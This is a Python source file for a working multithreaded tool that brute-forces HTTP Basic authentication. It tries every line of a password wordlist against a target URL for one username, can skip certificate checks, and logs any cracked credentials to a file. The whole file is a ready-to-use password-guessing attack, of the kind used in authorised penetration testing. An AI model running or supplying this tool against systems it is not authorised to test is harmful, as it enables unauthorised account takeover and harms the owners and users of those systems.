#!/usr/bin/env python

from time import sleep
import requests
import sys
import argparse
import signal
import os
import threading
import queue
from urllib.parse import urlparse


# Print the current line on when terminated via ctrl-c
def signal_handler(signal, frame):
    print('Stopped at line: ' + str(currentLine))
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# PARSING ARGS

parser = argparse.ArgumentParser(description='HTTP Auth Brute Force Tool')
parser.add_argument('Target', metavar='target', type=str, help='The target URI. ex http://192.168.1.1')
parser.add_argument('Wordlist', metavar='words', type=str, help='The wordlist to choose passwords from')
parser.add_argument('Username', metavar='user', type=str, help='The username to use')
parser.add_argument("--delay", type=int, help='Time in milliseconds between each request', default=5)
parser.add_argument("--startat", type=int, help='Start at this line in the file', default=0)
parser.add_argument("--ignore-consecutive-empty", type=int, help='Ignore this many consec. empty lines before exiting',
                    default=4)
parser.add_argument("--threads", type=int, help='Number of concurrent threads (default: 1)', default=1)
parser.add_argument("--verbose", "-v", action="store_true", help='Enable verbose output')
parser.add_argument("--output", "-o", type=str, help='Output results to file')
parser.add_argument("--ignore-invalid-certificate", action="store_true", help='Ignore untrusted certs', default=False)

args = parser.parse_args()

# Input validation
def validate_inputs():
    """Validate command line arguments and input files"""
    # Validate target URL
    try:
        parsed_url = urlparse(args.Target)
        if not parsed_url.scheme or not parsed_url.netloc:
            print("Error: Invalid target URL format. Must include scheme (http:// or https://)")
            sys.exit(1)
    except Exception as e:
        print(f"Error: Invalid target URL: {e}")
        sys.exit(1)
    
    # Validate wordlist file exists and is readable
    if not os.path.isfile(args.Wordlist):
        print(f"Error: Wordlist file '{args.Wordlist}' not found")
        sys.exit(1)
    
    try:
        with open(args.Wordlist, 'r') as f:
            f.readline()  # Test if file is readable
    except Exception as e:
        print(f"Error: Cannot read wordlist file '{args.Wordlist}': {e}")
        sys.exit(1)
    
    # Validate delay
    if args.delay < 0:
        print("Error: Delay must be non-negative")
        sys.exit(1)
    
    # Validate startat
    if args.startat < 0:
        print("Error: Start line must be non-negative")
        sys.exit(1)
        
    # Validate threads
    if args.threads < 1 or args.threads > 50:
        print("Error: Number of threads must be between 1 and 50")
        sys.exit(1)

validate_inputs()
# END ARGS

# GLOBAL VARS
delay = args.delay
target = args.Target
username = args.Username
wordlist = args.Wordlist
startAt = args.startat
count = 0
maxEmptyCount = args.ignore_consecutive_empty
currentLine = 0
ignoreBadCerts = args.ignore_invalid_certificate
numThreads = args.threads
verbose = args.verbose
outputFile = args.output
found_password = False
connection_failed = False
password_queue = queue.Queue()
results_lock = threading.Lock()
# END VARS

def test_password(pwd, line_number):
    """Test a single password"""
    global found_password, connection_failed
    
    if found_password:
        return
    
    try:
        # Configure SSL verification
        verify_ssl = not ignoreBadCerts
        
        # Make HTTP request with basic auth
        response = requests.get(
            target,
            auth=(username, pwd),
            verify=verify_ssl,
            timeout=10,  # 10 second timeout
            headers={'User-Agent': 'BrutePy/1.0'}
        )
        
        with results_lock:
            if found_password:
                return
                
            if verbose:
                print(f"Trying: {username}:[REDACTED] (line {line_number}) -> {response.status_code}")
            elif line_number % 10 == 0:  # Progress every 10 attempts
                print(f"Progress: tested {line_number} passwords...")
            
            if response.status_code == 200:
                found_password = True
                print(f"\n[SUCCESS] Authentication successful!")
                print(f"Username: {username}")
                print(f"Password found at line: {line_number}")
                if outputFile:
                    with open(outputFile, 'a') as f:
                        f.write(f"SUCCESS: {target} - {username}:{pwd} (line {line_number})\n")
                return True
            elif response.status_code == 401:
                if verbose:
                    print("Authentication failed (401 Unauthorized)")
            elif response.status_code == 403:
                if verbose:
                    print("Access forbidden (403) - credentials may be valid but access denied")
            else:
                if verbose:
                    print(f"Unexpected response: {response.status_code}")
                    
    except requests.exceptions.ConnectionError as e:
        with results_lock:
            print(f"Error: Connection failed - {e}")
            connection_failed = True
            # If this is early in the scan, it's likely the target is unreachable
            if line_number <= 2:
                found_password = True  # Signal other threads to stop
        return False
    except requests.exceptions.Timeout:
        if verbose:
            print("Error: Request timed out")
    except requests.exceptions.SSLError as e:
        print(f"Error: SSL/TLS error - {e}")
        if not ignoreBadCerts:
            print("Try using --ignore-invalid-certificate flag for self-signed certificates")
        return False
    except Exception as e:
        if verbose:
            print(f"Error during request: {e}")
    
    return False

def worker():
    """Worker thread function"""
    while not found_password:
        try:
            pwd, line_number = password_queue.get(timeout=1)
            if pwd is None:  # Sentinel value to stop worker
                break
            test_password(pwd, line_number)
            
            # Apply delay between requests
            if delay > 0:
                sleep(delay / 1000.0)
                
            password_queue.task_done()
        except queue.Empty:
            continue

print(f"Starting HTTP Basic Auth brute force against: {target}")
print(f"Username: {username}")
print(f"Wordlist: {wordlist}")
print(f"Delay: {delay}ms between requests")
print(f"Threads: {numThreads}")
print(f"SSL verification: {'disabled' if ignoreBadCerts else 'enabled'}")
if startAt > 0:
    print(f"Starting at line: {startAt}")
if outputFile:
    print(f"Output file: {outputFile}")
print("-" * 50)

try:
    # Start worker threads
    threads = []
    for i in range(numThreads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Read passwords and queue them
    with open(wordlist, "r") as f:
        pwd = f.readline().strip('\n')
        if startAt > 0:
            print(f"Skipping: {startAt} lines")
            while count < startAt and pwd:
                pwd = f.readline().rstrip('\n')
                count += 1
                currentLine += 1
        
        while pwd and not found_password:
            currentLine += 1
            emptyCount = 0
            
            # Only queue non-empty passwords
            if pwd.strip():
                password_queue.put((pwd, currentLine))
                
                # Check if we should stop early due to connection failures
                if currentLine >= 2:  # Check after just 2 attempts
                    sleep(0.05)  # Give threads time to process
                    if found_password:  # Will be set to True if connection fails early
                        print("\nStopping scan due to connection failures.")
                        break
            
            pwd = f.readline().rstrip('\n')
            
            # Handle consecutive empty lines
            while not pwd:
                emptyCount += 1
                if emptyCount > maxEmptyCount:
                    print(f"\nReached {maxEmptyCount} consecutive empty lines. Ending scan.")
                    break
                pwd = f.readline().rstrip('\n')
                if not pwd and f.tell() == os.fstat(f.fileno()).st_size:
                    # Reached end of file
                    break
    
    # Wait for all queued passwords to be processed
    password_queue.join()
    
    # Stop all worker threads
    for i in range(numThreads):
        password_queue.put((None, 0))  # Sentinel values
    
    for t in threads:
        t.join(timeout=1)
    
    if found_password:
        # Check if we found a password or just stopped due to connection failure
        if connection_failed:
            print("\nScan stopped due to connection failure.")
            sys.exit(1)
        else:
            print("\nPassword found! Exiting.")
            sys.exit(0)
    else:
        print(f"\nScan completed. Tried {currentLine} passwords.")
        print("No valid credentials found.")
        sys.exit(1)  # Exit with error code when no credentials found

except FileNotFoundError:
    print(f"Error: Wordlist file '{wordlist}' not found")
    sys.exit(1)
except KeyboardInterrupt:
    print(f"\nScan interrupted by user at line {currentLine}")
    found_password = True  # Stop all threads
    sys.exit(0)
except Exception as e:
    print(f"Unexpected error: {e}")
    sys.exit(1)



